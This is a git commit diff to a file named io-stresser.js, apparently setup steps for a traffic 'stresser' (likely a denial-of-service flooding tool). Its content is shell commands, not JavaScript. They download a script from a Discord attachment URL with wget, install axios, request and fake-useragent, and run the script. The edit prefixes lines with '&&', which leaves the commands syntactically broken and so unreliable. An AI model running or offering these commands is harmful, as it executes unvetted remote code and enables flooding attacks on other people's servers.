7a777475d4ba14642f829850223932123f5a614a
Đậu Đậu <59077968+DauDau432@users.noreply.github.com>
2022-01-18 09:36:30 +0700

    Update io-stresser.js

--- io-stresser.js
+++ io-stresser.js
@@ -1,5 +1,5 @@
 wget https://cdn.discordapp.com/attachments/912663711297183744/918331196008710254/io-stresser.js
-npm install axios
-npm install request
-npm install fake-useragent
-node io-stresser.js
+&& npm install axios
+&& npm install request
+&& npm install fake-useragent
+&& node io-stresser.js
